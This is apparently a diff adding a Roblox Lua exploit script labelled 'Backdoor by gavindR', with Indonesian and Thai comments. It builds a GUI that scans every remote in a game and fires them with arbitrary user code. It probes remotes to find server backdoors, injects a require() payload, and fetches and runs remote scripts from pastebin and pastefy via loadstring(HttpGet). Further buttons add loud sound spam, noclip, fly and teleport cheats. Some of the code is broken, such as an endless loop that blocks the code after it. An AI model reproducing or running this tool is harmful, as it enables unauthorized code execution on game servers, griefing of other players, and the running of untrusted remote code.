+	Cody.TextSize = 20 * focusScale -- misal perbesar 1.5x
+end)
+
+-- Event ketika TextBox berhenti fokus (klik di luar)
+Cody.FocusLost:Connect(function()
+	Cody.TextScaled = false
+	Cody.TextSize = 20 * normalScale -- kembali ukuran semula
+end)
+
+Execy.Active = true
+Execy.BackgroundColor3 = Color3.new(0,0,0)
+Execy.BorderColor3 = Color3.new(1,0,0)
+Execy.Name = "Execute"
+Execy.Parent = InPrt
+Execy.Position = UDim2.new(0,5,0,150)
+Execy.Size = UDim2.new(0,170,0,35)
+Execy.Font = Enum.Font.Legacy
+Execy.FontSize = Enum.FontSize.Size14
+Execy.Text = 'Execute!'
+Execy.TextColor3 = Color3.new(1,0,0)
+
+Acqur.Active = true
+Acqur.BackgroundColor3 = Color3.new(0,0,0)
+Acqur.BorderColor3 = Color3.new(1,0,0)
+Acqur.Name = "Acquire"
+Acqur.Parent = InPrt
+Acqur.Position = UDim2.new(0,185,0,150)
+Acqur.Size = UDim2.new(0,170,0,35)
+Acqur.Font = Enum.Font.Legacy
+Acqur.FontSize = Enum.FontSize.Size14
+Acqur.Text = 'Acquire!'
+Acqur.TextColor3 = Color3.new(1,0,0)
+
+CLR.Active = true
+CLR.BackgroundColor3 = Color3.new(0,0,0)
+CLR.BorderColor3 = Color3.new(1,0,0)
+CLR.Name = "Claaf"
+CLR.Parent = InPrt
+CLR.Position = UDim2.new(0,5,0,195)
+CLR.Size = UDim2.new(0,170,0,35)
+CLR.Font = Enum.Font.Legacy
+CLR.FontSize = Enum.FontSize.Size14
+CLR.Text = 'Clear'
+CLR.TextColor3 = Color3.new(1,0,0)
+
+r6.Active = true
+r6.BackgroundColor3 = Color3.new(0,0,0)
+r6.BorderColor3 = Color3.new(1,0,0)
+r6.Name = "R6"
+r6.Parent = InPrt
+r6.Position = UDim2.new(0, 200, 0, 193)
+r6.Size = UDim2.new(0,55,0,35)
+r6.Font = Enum.Font.Legacy
+r6.FontSize = Enum.FontSize.Size14
+r6.Text = 'r6!'
+r6.TextColor3 = Color3.new(1,0,0)
+
+re.Active = true
+re.BackgroundColor3 = Color3.new(0,0,0)
+re.BorderColor3 = Color3.new(1,0,0)
+re.Name = "re"
+re.Parent = InPrt
+re.Position = UDim2.new(0, 290, 0, 193)
+re.Size = UDim2.new(0,55,0,35)
+re.Font = Enum.Font.Legacy
+re.FontSize = Enum.FontSize.Size14
+re.Text = 'Reset!'
+re.TextColor3 = Color3.new(1,0,0)
+
+g.Active = true
+g.BackgroundColor3 = Color3.new(0,0,0)
+g.BorderColor3 = Color3.new(1,0,0)
+g.Name = "sosisj"
+g.Parent = InPrt
+g.Position = UDim2.new(0, 86, 0, 236)
+g.Size = UDim2.new(0,205,0,35)
+g.Font = Enum.Font.Legacy
+g.FontSize = Enum.FontSize.Size14
+g.Text = 'gavindr gui script on top!'
+g.TextColor3 = Color3.new(1,0,0)
+
+Labely.Active = true
+Labely.BackgroundColor3 = Color3.new(0,0,0)
+Labely.BorderColor3 = Color3.new(1,0,0)
+Labely.Name = "Title"
+Labely.Parent = MnPrt
+Labely.Position = UDim2.new(0,180,0,25)
+Labely.Size = UDim2.new(0,0,0,0)
+Labely.Font = Enum.Font.Legacy
+Labely.FontSize = Enum.FontSize.Size14
+Labely.Text = 'Backdoor by gavindR'
+Labely.TextColor3 = Color3.new(0,0,0)
+
+-- Add functionalities!
+
+local AcquiredRemote = nil 
+local IsAcquiring = false 
+
+
+
+Execy.MouseButton1Click:Connect(function()
+	-- Fetch code from TextBox.
+	local CodeStr = Cody.Text
+	local InvokeFunc = Instance.new("BindableEvent")
+	InvokeFunc.Event:Connect(function(rfunc,codestr2)
+		-- This invokes the RemoteFunction without waiting.
+		rfunc:InvokeServer(codestr2)
+	end)
+	local function DeepFire(inst)
+		if not IsAcquiring then 
+		if AcquiredRemote == nil then 
+		-- Search every descendant of DataModel.
+		for _, childy in inst:GetChildren() do
+			-- We don't want remotes from RobloxReplicatedStorage!
+			if childy.Parent ~= game:GetService('RobloxReplicatedStorage') then
+				-- Check the class of the descendant.
+				if childy:IsA("RemoteEvent") then
+					-- If it is a RemoteEvent, fire it with code!
+					print(" Running "..childy.ClassName..' "'..childy.Name..'".')
+					childy:FireServer(CodeStr)
+				elseif childy:IsA("RemoteFunction") then
+					print(" Running "..childy.ClassName..' "'..childy.Name..'".')
+					InvokeFunc:Fire(childy, CodeStr)
+				end
+			end
+				-- Keep looping through descendants, until dead end.
+			DeepFire(childy)
+		end 
+		else 
+		if AcquiredRemote:IsA("RemoteEvent") then 
+			AcquiredRemote:FireServer(CodeStr) 
+		elseif AcquiredRemote:IsA("RemoteFunction") then 
+			task.spawn(function() AcquiredRemote:InvokeServer(CodeStr) end) 
+		end
+		end 
+		end
+	end
+	-- Call the function!
+	warn(" Running all remotes with code:\n"..CodeStr)
+	DeepFire(game)
+end)
+
+-- While making this acquire feature, my brain almost exploded.
+
+Acqur.MouseButton1Click:Connect(function() 
+	local RemoteList = {} 
+	local CurrentRemote = nil 
+	local isFound = false
+	if not isAcquiring then 
+		isAcquiring = true 
+		warn('Scanning Started!') 
+		Cody.Text = '-- Please wait, while we are scanning the remotes.'
+		for i,v in pairs(game:GetDescendants()) do 
+			if v.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+				if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then 
+					debug('Getting '..v.ClassName..' "'..v.Name..'" into RemoteList.')
+					table.insert(RemoteList,v) 
+				end 
+			end
+		end 
+		for a,b in pairs(RemoteList) do
+			if AcquiredRemote == nil then 
+				print(" Checking "..b.ClassName..' "'..b.Name..'".') 
+				local NeededNameOfModel = string.char(math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A),math.random(0x0041,0x005A)) 
+				local NeededCode = 'Instance.new("Model",workspace).Name="'..NeededNameOfModel ..'"'
+				CurrentRemote = b 
+				if b.Parent ~= game:GetService('RobloxReplicatedStorage') then 
+					if b:IsA('RemoteEvent') then 
+						debug('Fired')
+						b:FireServer(NeededCode) 
+					elseif b:IsA('RemoteFunction') then 
+						debug('Invoked')
+						task.spawn(function() b:InvokeServer(NeededCode) end) 
+					end 
+				end 
+				debug('Awaiting')
+				wait(2.5) 
+				if workspace:FindFirstChild(NeededNameOfModel) then 
+					debug('Detected')
+					if workspace:FindFirstChild(NeededNameOfModel):IsA("Model") then 
+						debug('Success')
+						AcquiredRemote = b
+					end 
+				end 
+			end 
+		end 	
+		if AcquiredRemote ~= nil then 
+			isFound = true 
+			Cody.Text = 'AM MERIKA' 
+			warn('RSTPI ')
+		else 
+			isFound = false 
+			Cody.Text = '-- Not found. :(' 
+			warn('No backdoor found')
+		end 
+		isAcquiring = false 
+	end 
+end)
+
+CLR.MouseButton1Click:Connect(function()  
+Cody.Text = ' '
+end)
+
+r6.MouseButton1Click:Connect(function() 
+function oof()
+    local Players = game:GetService("Players")
+    local plr = Players.LocalPlayer
+    local char = plr.Character or plr.CharacterAdded:Wait()
+    
+    -- แปลง R15 → R6
+    if char:FindFirstChild("Humanoid") and char.Humanoid.RigType == Enum.HumanoidRigType.R15 then
+        local desc = Players:GetHumanoidDescriptionFromUserId(plr.CharacterAppearanceId)
+        local newChar = Players:CreateHumanoidModelFromDescription(desc, Enum.HumanoidRigType.R6)
+        newChar.Name = plr.Name
+
+        if not newChar.PrimaryPart and newChar:FindFirstChild("HumanoidRootPart") then
+            newChar.PrimaryPart = newChar:FindFirstChild("HumanoidRootPart")
+        end
+        if newChar.PrimaryPart and char:FindFirstChild("HumanoidRootPart") then
+            newChar:SetPrimaryPartCFrame(char.PrimaryPart.CFrame)
+        end
+
+        char:Destroy()
+        newChar.Parent = workspace
+        plr.Character = newChar
+
+        local cam = workspace.CurrentCamera
+        cam.CameraSubject = newChar:WaitForChild("Humanoid")
+        cam.CameraType = Enum.CameraType.Custom
+    end
+
+    local c = workspace:WaitForChild(plr.Name)
+    local Humanoid = c:WaitForChild("Humanoid")
+    local pose = "Standing"
+    local currentAnimTrack = nil
+    local currentAnimSpeed = 1.0
+
+    -- Animation assets R6
+    local anims = {
+        idle = "http://www.roblox.com/asset/?id=180435571",
+        walk = "http://www.roblox.com/asset/?id=180426354",
+        jump = "http://www.roblox.com/asset/?id=125750702",
+        fall = "http://www.roblox.com/asset/?id=180436148"
+    }
+
+    -- เล่น Animation
+    local function playAnim(animId, speed)
+        if currentAnimTrack then
+            currentAnimTrack:Stop()
+            currentAnimTrack:Destroy()
+        end
+        local anim = Instance.new("Animation")
+        anim.AnimationId = animId
+        currentAnimTrack = Humanoid:LoadAnimation(anim)
+        currentAnimTrack.Priority = Enum.AnimationPriority.Core
+        currentAnimTrack:Play(0.1)
+        if speed then
+            currentAnimTrack:AdjustSpeed(speed)
+        else
+            currentAnimTrack:AdjustSpeed(1.0)
+        end
+    end
+
+    -- Event functions
+    Humanoid.Running:Connect(function(speed)
+        if speed > 0.01 then
+            playAnim(anims.walk, speed / Humanoid.WalkSpeed)
+            pose = "Running"
+        else
+            playAnim(anims.idle)
+            pose = "Standing"
+        end
+    end)
+
+    Humanoid.Jumping:Connect(function()
+        playAnim(anims.jump)
+        pose = "Jumping"
+    end)
+
+    Humanoid.FreeFalling:Connect(function()
+        if pose ~= "Jumping" then
+            playAnim(anims.fall)
+            pose = "FreeFall"
+        end
+    end)
+
+    Humanoid.Died:Connect(function()
+        pose = "Dead"
+    end)
+
+    -- Initialize idle
+    playAnim(anims.idle)
+    pose = "Standing"
+end
+
+oof()
+
+-- Respawn KeyInput
+local UIS = game:GetService("UserInputService")
+local plr = game.Players.LocalPlayer
+local deathPos = nil
+
+plr.CharacterAdded:Connect(function(char)
+    local hrp = char:WaitForChild("HumanoidRootPart")
+    if deathPos then
+        hrp.CFrame = deathPos
+    end
+end)
+
+while true do wait(0.1)
+    local char = plr.Character
+    if char and char:FindFirstChild("Humanoid") then
+        if char.Humanoid.Health <= 0 then
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                deathPos = hrp.CFrame
+            end
+        end
+    end
+end
+
+UIS.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Insert and deathPos then
+        local char = plr.Character
+        if char and char:FindFirstChild("HumanoidRootPart") then
+            char.HumanoidRootPart.CFrame = deathPos
+        end
+    end
+end)
+
+	DeepFire(game)
+end)
+
+re.MouseButton1Click:Connect(function() 
+local player = game.Players.LocalPlayer
+
+if player.Character and player.Character:FindFirstChild("Humanoid") then
+	player.Character.Humanoid.Health = 0
+end
+
+	DeepFire(game)
+end)
+
+g.MouseButton1Click:Connect(function() 
+local playerName = game.Players.LocalPlayer.Name
+local codeText = 'require(110047253067635):Hload( "' .. playerName .. '" ) '
+Cody.Text = codeText
+	DeepFire(game)
+
+end)
+
+local function createButton(text, pos, callback)
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0, 100, 0, 50)
+    button.Name = text
+    button.Position = pos
+    button.BackgroundColor3 = Color3.fromRGB(70, 0, 0) 
+    button.TextColor3 = Color3.new(1, 1, 1)
+    button.Parent = Frameeeee2
+    button.Text = text
+    button.TextScaled = true
+    local kk = Instance.new("UICorner", button) 
+    kk.CornerRadius = UDim.new(0, 8) 
+    local grad = Instance.new("UIGradient")
+    grad.Parent = button
+
+    grad.Color = ColorSequence.new({
+   	ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),   -- Merah
+ 	  ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 255)),    -- Biru
+   	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 255))   -- Merah
+    })
+    button.MouseButton1Click:Connect(callback)
+    return button
+end
+
+-- That's the end of the code!
+-- Frame Utama
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = 'Pagessss'
+mainFrame.Size = UDim2.new(0, 300, 0, 200)
+mainFrame.Position = UDim2.new(0.5, 400, 0.2, -150)
+mainFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = Frameeeee2
+
+-- Tombol Page
+local pageBtnsFrame = Instance.new("Frame")
+pageBtnsFrame.Size = UDim2.new(1, 0, 0, 40)
+pageBtnsFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+pageBtnsFrame.Parent = mainFrame
+
+local UIListLayout = Instance.new("UIListLayout", pageBtnsFrame)
+UIListLayout.FillDirection = Enum.FillDirection.Horizontal
+UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
+UIListLayout.Padding = UDim.new(0, 6)
+
+local Pages = {}
+
+local function CreatePageButton(Name, PageNum)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(0, 100, 1, 0)
+	btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+	btn.TextColor3 = Color3.new(1,1,1)
+	btn.Text = Name
+	btn.Parent = pageBtnsFrame
+
+	btn.MouseButton1Click:Connect(function()
+		for i,v in pairs(Pages) do
+			v.Visible = false
+		end
+		Pages[PageNum].Visible = true
+	end)
+end
+
+-- Function create page
+local function CreatePage(PageNum)
+	local page = Instance.new("ScrollingFrame")
+page.Size = UDim2.new(1, 0, 1, -40)
+page.Position = UDim2.new(0, 0, 0, 40)
+page.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+page.ScrollBarThickness = 6
+page.Visible = false
+page.Parent = mainFrame
+
+-- Otomatis menyesuaikan tinggi scroll
+page.AutomaticCanvasSize = Enum.AutomaticSize.Y
+page.ScrollingDirection = Enum.ScrollingDirection.Y
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Padding = UDim.new(0, 8)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+listLayout.Parent = page
+
+	Pages[PageNum] = page
+	return page
+end
+
+-- Buat ketiga page
+local Page1 = CreatePage(1)
+local Page2 = CreatePage(2)
+local Script = CreatePage(3)
+Pages[1].Visible = true -- default tampil page 1
+
+-- Tambah tombol page selector
+CreatePageButton("Page 1", 1)
+CreatePageButton("Page 2", 2)
+CreatePageButton("Script ", 3)
+
+-- Tambah tombol contoh ke setiap halaman
+local function AddButton(page, text, callback)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, -20, 0, 40)
+	btn.BackgroundColor3 = Color3.fromRGB(80,80,80)
+	btn.TextColor3 = Color3.new(1,1,1)
+	btn.Text = text
+	btn.Parent = page
+
+	btn.MouseButton1Click:Connect(function()
+		if callback then
+			callback()
+		end
+	end)
+end
+
+
+local wc = workspace
+
+AddButton(Page1, "Troll Song", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://112626671704099"
+    c.Pitch = 0.2
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+
+AddButton(Page1, "Collkido", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://94795824357273"
+    c.Pitch = 0.143
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+AddButton(Page1, "NOOT NOOT C", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://114190526353443"
+    c.Pitch = 0.165
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    local distort = Instance.new("DistortionSoundEffect")
+    distort.Level = 15 -- 0 = normal, 1 = paling rusak
+    distort.Parent = c
+    c:Play()
+end)
+
+
+AddButton(Page1, "Dont Touch my pizza D", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://85015654238076"
+    c.Pitch = 0.08
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+AddButton(Page1, "Bypassed FPE song E", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://127653283576622"
+    c.Pitch = 1.16767676
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+
+AddButton(Page1, "Can You fill my h G", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://15689448519"
+    c.Pitch = 1
+    c.Looped = true
+    c.Volume = 1
+    c.Parent = wc
+    c:Play()
+end)
+AddButton(Page1, "Spokiy skary skelrtons A", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://77484784570543"
+    c.Pitch = 0.09
+    c.Looped = true
+    c.Volume = 1
+    c.Parent = wc
+    c:Play()
+end)
+
+AddButton(Page1, "Wongka B", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://100792696468630"
+    c.Pitch = 0.14
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+AddButton(Page1, "Allah Huakbar 2x C", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://113031811875792"
+    c.Pitch = 0.1
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+
+AddButton(Page1, "Lois Fuck D", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://105819456196233"
+    c.Pitch = 0.29
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+AddButton(Page1, "Sugar Crash E", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://107020752830019"
+    c.Pitch = 0.15
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+
+AddButton(Page1, "Won'st Stop us C G", function()
+local c = Instance.new("Sound")
+    c.Name = "LaughterClose"
+    c.SoundId = "rbxassetid://1847661821"
+    c.Pitch = 1
+    c.Looped = true
+    c.Volume = 10
+    c.Parent = wc
+    c:Play()
+end)
+
+AddButton(Page2, "Stop all music G", function()
+for _, s in ipairs(workspace:GetDescendants()) do
+	if s:IsA("Sound") and s.Name == "LaughterClose" then
+		pcall(function()
+			if s and s.Parent then
+				s:Stop()
+				task.wait(0.01)
+				s.Parent = nil -- hapus dengan aman dulu
+				task.wait(0.01)
+				s:Destroy()
+			end
+		end)
+	end
+end
+end)
+
+AddButton(Page2, "distor G", function()
+
+end)
+
+AddButton(Script , "Noclip", function()
+local player = game:GetService("Players").LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+for _, part in pairs(character:GetChildren()) do
+    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
+        part.CanCollide = false
+    end
+end
+end)
+
+AddButton(Script , "Unnoclip", function()
+local player = game:GetService("Players").LocalPlayer
+local character = player.Character
+
+if character then
+    for _, part in pairs(character:GetChildren()) do
+        if part:IsA("BasePart") then
+            part.CanCollide = true
+        end
+    end
+end
+end)
+
+AddButton(Script , "PRIMADON", function()
+loadstring(game:HttpGet("https://pastebin.com/raw/37iQzQp3"))()
+end)
+
+AddButton(Script , "DABABY CAR", function()
+loadstring(game:HttpGet("https://pastefy.app/xtIOQGPy/raw"))()
+end)
+
+ AddButton(Script , "", function()
+
+end)
+
+AddButton(Script , "", function()
+
+end)
+
+AddButton(Script , "", function()
+
+end)
+
+AddButton(Script , "", function()
+
+end)
+
+
+-- Frame utama
+local frame = Instance.new("Frame", Frameeeee2)
+frame.Name = 'Twweeens'
+frame.Size = UDim2.new(0, 370, 0, 260)
+frame.Position = UDim2.new(0, -408, 0, 380)
+frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = false
+frame.Name = "MoveFrame"
+
+-- Font & Style
+local FONT = Enum.Font.GothamBold
+
+-- Label judul
+local title = Instance.new("TextLabel", frame)
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "🧭 Gerak X / Y / Z (Tween + Custom Dist)"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.Font = FONT
+title.TextSize = 18
+
+-- Fungsi Tween halus
+local function tweenMove(targetCF)
+	local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
+	local tween = TweenService:Create(hrp, tweenInfo, {CFrame = targetCF})
+	tween:Play()
+end
+
+-- Template buat satu baris kontrol arah
+local function buatBaris(nama, warna, posisiY, sumbu)
+	local dist = 15 -- default jarak awal
+	local container = Instance.new("Frame", frame)
+	container.Size = UDim2.new(0, 350, 0, 40)
+	container.Position = UDim2.new(0, 10, 0, posisiY)
+	container.BackgroundTransparency = 1
+
+	local label = Instance.new("TextLabel", container)
+	label.Size = UDim2.new(0, 80, 0, 40)
+	label.Text = nama .. ": " .. dist
+	label.TextColor3 = Color3.fromRGB(255,255,255)
+	label.BackgroundTransparency = 1
+	label.Font = FONT
+	label.TextSize = 16
+
+	local btnMinus = Instance.new("TextButton", container)
+	btnMinus.Size = UDim2.new(0, 25, 0, 25)
+	btnMinus.Position = UDim2.new(0, 90, 0, 7)
+	btnMinus.Text = "-"
+	btnMinus.Font = FONT
+	btnMinus.TextSize = 20
+	btnMinus.BackgroundColor3 = Color3.fromRGB(255,100,100)
+	btnMinus.TextColor3 = Color3.fromRGB(255,255,255)
+
+	local btnPlus = Instance.new("TextButton", container)
+	btnPlus.Size = UDim2.new(0, 25, 0, 25)
+	btnPlus.Position = UDim2.new(0, 120, 0, 7)
+	btnPlus.Text = "+"
+	btnPlus.Font = FONT
+	btnPlus.TextSize = 20
+	btnPlus.BackgroundColor3 = Color3.fromRGB(100,255,100)
+	btnPlus.TextColor3 = Color3.fromRGB(255,255,255)
+
+	local btnGerak = Instance.new("TextButton", container)
+	btnGerak.Size = UDim2.new(0, 100, 0, 40)
+	btnGerak.Position = UDim2.new(0, 160, 0, 0)
+	btnGerak.Text = "Gerak"
+	btnGerak.Font = FONT
+	btnGerak.TextSize = 18
+	btnGerak.BackgroundColor3 = warna
+	btnGerak.TextColor3 = Color3.fromRGB(255,255,255)
+
+	-- Fungsi gerak arah tertentu
+	local function gerak()
+		local cf = hrp.CFrame
+		if sumbu == "X+" then
+			tweenMove(cf * CFrame.new(dist, 0, 0))
+		elseif sumbu == "X-" then
+			tweenMove(cf * CFrame.new(-dist, 0, 0))
+		elseif sumbu == "Y+" then
+			tweenMove(cf * CFrame.new(0, dist, 0))
+		elseif sumbu == "Y-" then
+			tweenMove(cf * CFrame.new(0, -dist, 0))
+		elseif sumbu == "Z+" then
+			tweenMove(cf * CFrame.new(0, 0, dist))
+		elseif sumbu == "Z-" then
+			tweenMove(cf * CFrame.new(0, 0, -dist))
+		end
+	end
+
+	-- Tombol fungsi
+	btnPlus.MouseButton1Click:Connect(function()
+		dist += 1
+		label.Text = nama .. ": " .. dist
+	end)
+
+	btnMinus.MouseButton1Click:Connect(function()
+		if dist > 1 then
+			dist -= 1
+			label.Text = nama .. ": " .. dist
+		end
+	end)
+
+	btnGerak.MouseButton1Click:Connect(gerak)
+end
+
+-- Baris-baris kontrol arah
+buatBaris("Maju (Z-)", Color3.fromRGB(255,80,80), 40, "Z-")
+buatBaris("Mundur (Z+)", Color3.fromRGB(80,255,100), 85, "Z+")
+buatBaris("Atas (Y+)", Color3.fromRGB(80,200,255), 130, "Y+")
+buatBaris("Bawah (Y-)", Color3.fromRGB(100,150,255), 175, "Y-")
+buatBaris("Kiri (X-)", Color3.fromRGB(150,255,100), 220, "X-")
+buatBaris("Kanan (X+)", Color3.fromRGB(80,255,150), 265, "X+")
+
+-- Tombol + dan -
+local function buatAdjustButton(teks, pos, warna, func)
+	local btn = Instance.new("TextButton", frame)
+	btn.Text = teks
+	btn.Size = UDim2.new(0, 25, 0, 25)
+	btn.Position = pos
+	btn.BackgroundColor3 = warna
+	btn.TextColor3 = Color3.fromRGB(255,255,255)
+	btn.Font = Enum.Font.GothamBold
+	btn.TextSize = 18
+	btn.MouseButton1Click:Connect(func)
+end
+
+-- Tambah & Kurang jarak
+buatAdjustButton("+", UDim2.new(0, 250, 0, 120), Color3.fromRGB(100,255,100), function()
+	moveDist = moveDist + 1
+	label.Text = "Jarak Gerak: "..moveDist
+end)
+
+buatAdjustButton("-", UDim2.new(0, 280, 0, 120), Color3.fromRGB(255,100,100), function()
+	if moveDist > 1 then
+		moveDist = moveDist - 1
+		label.Text = "Jarak Gerak: "..moveDist
+	end
+end)
+
+-- LocalScript (StarterPlayerScripts atau executor FE-safe)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+
+
+-- ✅ Fly GUI PRO Final (Swim Fly, Smooth Camera, Mobile Perfect)
+-- LocalScript - StarterPlayerScripts (Game kamu sendiri)
+
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+
+local character = player.Character or player.CharacterAdded:Wait()
+local humanoid = character:WaitForChild("Humanoid")
+local rootPart = character:WaitForChild("HumanoidRootPart")
+
+local flyEnabled = false
+local speed = 50
+local speedStep = 10
+local mode = "A" -- A = badan miring, B = lurus
+
+-- Refresh saat respawn
+player.CharacterAdded:Connect(function(char)
+	character = char
+	humanoid = char:WaitForChild("Humanoid")
+	rootPart = char:WaitForChild("HumanoidRootPart")
+	flyEnabled = false
+end)
+
+-- ✅ GUI
+
+
+local frame = Instance.new("Frame", Frameeeee2)
+frame.Size = UDim2.new(0, 240, 0, 120)
+frame.AnchorPoint = Vector2.new(0.5, 1)
+frame.Position = UDim2.new(0.5, -725, 1, -757)
+frame.BackgroundColor3 = Color3.fromRGB(20,20,20)
+frame.BackgroundTransparency = 0.35
+frame.BorderSizePixel = 0
+frame.Name = "FlyFrame"
+
+local toggle = Instance.new("TextButton", frame)
+toggle.Size = UDim2.new(0, 110, 0, 38)
+toggle.Position = UDim2.new(0,10,0,10)
+toggle.Text = "Fly: OFF"
+toggle.BackgroundColor3 = Color3.fromRGB(55,55,55)
+toggle.TextColor3 = Color3.new(1,1,1)
+
+local modeBtn = Instance.new("TextButton", frame)
+modeBtn.Size = UDim2.new(0, 90, 0, 38)
+modeBtn.Position = UDim2.new(0,130,0,10)
+modeBtn.Text = "Mode: A"
+modeBtn.BackgroundColor3 = Color3.fromRGB(60,60,100)
+modeBtn.TextColor3 = Color3.new(1,1,1)
+
+local plus = Instance.new("TextButton", frame)
+plus.Size = UDim2.new(0,45,0,35)
+plus.Position = UDim2.new(0,10,0,60)
+plus.Text = "+"
+plus.BackgroundColor3 = Color3.fromRGB(40,120,40)
+plus.TextColor3 = Color3.new(1,1,1)
+
+local minus = Instance.new("TextButton", frame)
+minus.Size = UDim2.new(0,45,0,35)
+minus.Position = UDim2.new(0,60,0,60)
+minus.Text = "-"
+minus.BackgroundColor3 = Color3.fromRGB(140,40,40)
+minus.TextColor3 = Color3.new(1,1,1)
+
+local speedLabel = Instance.new("TextLabel", frame)
+speedLabel.Size = UDim2.new(0,140,0,35)
+speedLabel.Position = UDim2.new(0,105,0,60)
+speedLabel.BackgroundTransparency = 1
+speedLabel.TextColor3 = Color3.new(1,1,1)
+speedLabel.Text = "Speed: "..speed
+speedLabel.TextScaled = true
+
+local function startFly()
+    flyEnabled = true
+    toggle.Text = "Fly: ON"
+    humanoid.PlatformStand = true
+end
+
+local function stopFly()
+    flyEnabled = false
+    toggle.Text = "Fly: OFF"
+    humanoid.PlatformStand = false
+end
+
+toggle.MouseButton1Click:Connect(function()
+	if flyEnabled then
+		stopFly()
+	else
+		startFly()
+	end
+end)
+
+-- ✅ Mode A/B
+modeBtn.MouseButton1Click:Connect(function()
+	mode = (mode == "A") and "B" or "A"
+	modeBtn.Text = "Mode: "..mode
+end)
+
+-- ✅ Speed adjust
+plus.MouseButton1Click:Connect(function()
+	speed += speedStep
+	speedLabel.Text = "Speed: "..speed
+end)
+
+minus.MouseButton1Click:Connect(function()
+	speed = math.max(1, speed - speedStep)
+	speedLabel.Text = "Speed: "..speed
+end)
+
+
+local RunService = game:GetService("RunService")
+local camera = workspace.CurrentCamera
+
